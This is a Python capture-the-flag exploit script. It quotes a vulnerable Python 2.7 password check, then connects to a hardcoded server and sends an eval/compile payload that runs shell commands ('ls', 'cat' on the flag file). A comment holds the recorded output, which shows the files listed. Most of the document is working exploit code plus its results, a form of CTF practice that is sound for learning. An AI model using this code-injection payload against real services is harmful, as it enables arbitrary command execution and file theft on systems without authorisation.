'''
import random
#doing this first this time
inp = str(input("Enter the password: "))
#so secure you canâ€™t get in even if you know the password
password = random.randint(0,2**30)
if (inp == password):
    flag = open("flagfilename",'r').read() #flagfilename is different serverside
    print flag 
else:
    print "WRONG password"
'''

#python 2.7 input() => eval(raw_input())

import socket

HOST = "104.131.90.29"
PORT = 8006

#payload = "eval(compile('import os;os.system(\"ls\")', '<string>', 'exec'))"
payload = "eval(compile('import os;os.system(\"ls\");os.system(\"cat flagfilename1345\")', '<string>', 'exec'))"

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print(sock.recv(1024))
    sock.sendall(payload.encode() + b'\n')
    print(sock.recv(1024))
    print(sock.recv(1024))
    print(sock.recv(1024))
    sock.close()

main()

'''
Run:
b'Enter the password: '
b'exploit2.py\nflagfilename1345\nrun\n'
b'next one will be more than just input exploitation\nWRONG password\n'
b''

'''